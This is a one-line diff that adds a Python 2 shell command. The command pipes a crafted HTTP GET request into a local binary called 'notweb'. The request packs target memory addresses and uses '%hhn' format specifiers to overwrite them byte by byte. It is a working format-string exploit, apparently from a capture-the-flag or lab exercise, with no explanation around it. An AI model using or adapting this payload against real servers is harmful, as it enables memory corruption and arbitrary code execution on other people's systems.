@@ -1,0 +1,1 @@
+python -c 'print "GET /echo:" + ":"*60 + "\xe0\x37\x06\x08" + "\xe1\x37\x06\x08" + "\xe2\x37\x06\x08" + "\xe3\x37\x06\x08" + "\x3c\xb0\x04\x08" + "\x3d\xb0\x04\x08" + "%8c%15$hhn" + "%6c%16$hhn" + "%245c%17$hhn" + "%6c%18$hhn" + "%173c%19$hhn" + "%125c%20$hhn" + " HTTP/1.1"' | ./notweb
